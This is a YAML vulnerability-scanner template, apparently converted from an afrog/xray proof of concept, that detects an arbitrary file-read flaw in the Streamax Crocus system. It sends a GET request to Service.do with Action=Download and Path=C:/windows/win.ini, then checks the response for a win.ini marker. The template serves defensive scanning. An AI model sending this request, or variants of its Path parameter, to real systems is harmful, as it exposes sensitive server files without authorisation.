# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - for 16-bit app support
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/Service.do?Action=Download&Path=C:/windows/win.ini'
id: crocus-service-do-fileread
info:
  author: zan8in
  description: Crocus系统存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感信息。
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 锐明技术Crocus系统存在任意文件读取
  severity: high
  tags: crocus,fileread,argus-import
